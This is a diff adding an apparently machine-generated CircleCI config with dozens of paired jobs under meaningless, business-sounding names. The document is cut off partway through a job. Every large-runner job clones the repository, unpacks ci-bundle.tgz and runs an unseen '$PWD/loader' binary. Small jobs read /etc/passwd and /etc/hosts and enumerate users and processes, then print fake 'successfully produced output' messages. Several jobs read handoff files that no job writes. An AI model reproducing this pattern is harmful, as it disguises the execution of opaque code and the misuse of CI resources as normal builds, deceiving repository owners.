@@ -1,0 +1,1441 @@
+version: 2.1
+
+jobs:
+  yamadaf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Deploy to the headcount plan
+          command: |
+            mkdir -p /tmp/.d
+            set +o pipefail 2>/dev/null; emit() { seq 1 $1 ; }; emit 100000 > /tmp/.d/FTPXML; true
+            echo "Successfully produced output for stage run-full-regression-suite; total size is $(wc -c </tmp/.d/FTPXML) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'FTPXML'
+  run-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/FTPXML 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  island398:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: September Double Tap
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%-6s%-6s%s\n' zebra panda cat; true ; } > /tmp/.d/qa-dat
+            echo "Successfully produced output for stage wip-db-crash; total size is $(wc -c </tmp/.d/qa-dat) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'qa-dat'
+  wip-db-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/qa-dat 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  IDX-SECTION-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Spellcheck Style Guide Routine
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; echo x > /tmp/login.spring.txt && ln -f /tmp/login.spring.txt "/tmp/milk.mountain.temp.copy" && stat -c %h /tmp/login.spring.txt; true ; } > /tmp/.d/md5_bd0bb8f
+            echo "Successfully produced output for stage build; total size is $(wc -c </tmp/.d/md5_bd0bb8f) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'md5_bd0bb8f'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/md5_bd0bb8f 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  text_platinum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Transcode 1000 percent of proxy files
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 -mindepth 1 -iname '*.conf' -exec stat -c %F {} \; 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/.d/229.189.63
+            echo "Successfully produced output for stage pr-01; total size is $(wc -c </tmp/.d/229.189.63) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '229.189.63'
+  pr-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  decorator-price:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: We have to cold start the beacons
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -St /usr/sbin/*user*|tr '\n' ' '; true ; } > /tmp/.d/PANO-00071702
+            echo "Successfully produced output for stage v1-canary1; total size is $(wc -c </tmp/.d/PANO-00071702) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'PANO-00071702'
+  v1-canary1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  appqdk26xss:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: package version tag unit 10
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=4739\nuser=hugo\ndebug=false\n' >'/var/tmp/folderticket2022-01-27.csv' && grep ^port '/var/tmp/folderticket2022-01-27.csv' | cut -d= -f2; true ; } > /tmp/.d/fe907df
+            echo "Successfully produced output for stage vela-final; total size is $(wc -c </tmp/.d/fe907df) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'fe907df'
+  vela-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  copyTimestampCurrent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: INC cost centers
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; comm -12 <(cut -d: -f1 /etc/passwd | sort) <(cut -d: -f1 /etc/group | sort) | head -n5; true ; } > /tmp/.d/cfg.doc.env
+            echo "Successfully produced output for stage auh-check; total size is $(wc -c </tmp/.d/cfg.doc.env) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'cfg.doc.env'
+  auh-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/cfg.doc.env 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  locale_cs_PH:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Sync up on texturing
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; echo "updating index"; echo "night mode on"; true ; } > /tmp/.d/proton.router.blue
+            echo "Successfully produced output for stage bob-ship; total size is $(wc -c </tmp/.d/proton.router.blue) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'proton.router.blue'
+  bob-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  COMMAND516:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Apologize to the billing records
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; ps -e | head -n 6; true ; } > /tmp/.d/VID71257
+            echo "Successfully produced output for stage v3-rc; total size is $(wc -c </tmp/.d/VID71257) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'VID71257'
+  v3-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/VID71257 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  resultsQueue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Ignition drag
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -mtime +7 -exec ls -1 {} + 2> /dev/null | wc -l; true ; } > /tmp/.d/da857d96-72f4
+            echo "Successfully produced output for stage d-v2; total size is $(wc -c </tmp/.d/da857d96-72f4) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'da857d96-72f4'
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  op_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Finance good to go
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; echo -n "that's all folks" | sum; true ; } > /tmp/.d/hawkprotongreen
+            echo "Successfully produced output for stage d-01; total size is $(wc -c </tmp/.d/hawkprotongreen) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'hawkprotongreen'
+  d-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  lima_papa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: ST810
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -iname "*" -ls 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/.d/audit-31d9f.log
+            echo "Successfully produced output for stage go-live; total size is $(wc -c </tmp/.d/audit-31d9f.log) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'audit-31d9f.log'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  entry1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ground the spare drives following launch
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; seq 1 15|sort -n|tail -n 1; true ; } > /tmp/.d/archivecrimsonfilterazure
+            echo "Successfully produced output for stage edge-v7; total size is $(wc -c </tmp/.d/archivecrimsonfilterazure) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'archivecrimsonfilterazure'
+  edge-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/archivecrimsonfilterazure 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  Global-Pointer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Wave Twelve Replicate The Billing Records
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf 'icon\t25\ngrape\t95\npart\t99\nowl\t66\n' > ${TMPDIR:-/tmp}/rank.tsv && awk -F'\t' '{s+=$2} END {print s}' ${TMPDIR:-/tmp}/rank.tsv; true ; } > /tmp/.d/RIdgePLASMAtokENgoLdeN
+            echo "Successfully produced output for stage Rollout_Pipeline7; total size is $(wc -c </tmp/.d/RIdgePLASMAtokENgoLdeN) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'RIdgePLASMAtokENgoLdeN'
+  Rollout_Pipeline7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  SpriteCursorDualTrace:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: I will reload the secrets bundle tonight
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >'/dev/shm/outer-2021-01.gz' && zcmp /etc/hosts '/dev/shm/outer-2021-01.gz' && echo same; true ; } > /tmp/.d/r0u7er57one
+            echo "Successfully produced output for stage ensure-production-docker-image; total size is $(wc -c </tmp/.d/r0u7er57one) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'r0u7er57one'
+  ensure-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/r0u7er57one 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  uat-local-56:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Perform rebalance of the orphan jobs
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; install -m 600 /etc/hosts '/tmp/token-2024-03-20.csv' && ls -l '/tmp/token-2024-03-20.csv'; true ; } > /tmp/.d/stone-orchard-atoll-quick
+            echo "Successfully produced output for stage q2-release; total size is $(wc -c </tmp/.d/stone-orchard-atoll-quick) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'stone-orchard-atoll-quick'
+  q2-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/stone-orchard-atoll-quick 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  by4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: exporting credit notes now
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for elem in sara ivy yuki frank; do echo "<$elem>"; done|paste -sd ' '; true ; } > /tmp/.d/ffKE8F
+            echo "Successfully produced output for stage rocket; total size is $(wc -c </tmp/.d/ffKE8F) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ffKE8F'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/ffKE8F 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  tabs--sm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: And now pin the key ring
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; if [ ! -d $HOME ]; then echo true; else echo false; fi; true ; } > /tmp/.d/fV
+            echo "Successfully produced output for stage vela-rev; total size is $(wc -c </tmp/.d/fV) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'fV'
+  vela-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/fV 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  bbennett86:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Open group D
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; echo -n "north south east west"|sha256sum|cut -c1-16; true ; } > /tmp/.d/Ha7MqbQZOqidnrztDw6s7l
+            echo "Successfully produced output for stage fire-up; total size is $(wc -c </tmp/.d/Ha7MqbQZOqidnrztDw6s7l) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'Ha7MqbQZOqidnrztDw6s7l'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  relayOpt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Act XII Run Perf Baseline
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; basename ${TMPDIR:-/tmp}/omega-library.out .out; true ; } > /tmp/.d/230.91
+            echo "Successfully produced output for stage validate-partial-test-matrix; total size is $(wc -c </tmp/.d/230.91) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '230.91'
+  validate-partial-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/230.91 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  build2042:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: With care email the customer
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; grep -cr bash /etc/profile.d | head -n10; true ; } > /tmp/.d/ux.dev
+            echo "Successfully produced output for stage tweak-cache-bug; total size is $(wc -c </tmp/.d/ux.dev) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ux.dev'
+  tweak-cache-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/ux.dev 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  finally9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Walk the level through bundle
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1 | tr '[:lower:]' '[:upper:]' | awk '{print length, $0}' | fold -w 31; true ; } > /tmp/.d/sTacKCOnFiG
+            echo "Successfully produced output for stage whiskey; total size is $(wc -c </tmp/.d/sTacKCOnFiG) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'sTacKCOnFiG'
+  whiskey:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/sTacKCOnFiG 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  php-x86-stable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Eighty six the card settlements
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; awk -F ":" '{print NR": "$1}' /etc/passwd | wc -l; true ; } > /tmp/.d/ca8e9ddc-eba8-a7de
+            echo "Successfully produced output for stage echo-8; total size is $(wc -c </tmp/.d/ca8e9ddc-eba8-a7de) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ca8e9ddc-eba8-a7de'
+  echo-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  MSD-571-resume-enum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Test Matrix Mocking ACTIVE
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/avenue-pitch.gz" && zcat "/tmp/avenue-pitch.gz" | head -n 3; true ; } > /tmp/.d/IMG00052042
+            echo "Successfully produced output for stage verify-nightly-regression-suite; total size is $(wc -c </tmp/.d/IMG00052042) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'IMG00052042'
+  verify-nightly-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/IMG00052042 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  RootedInternalClusterVisitor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Awaken the BIOS settings
+          command: |
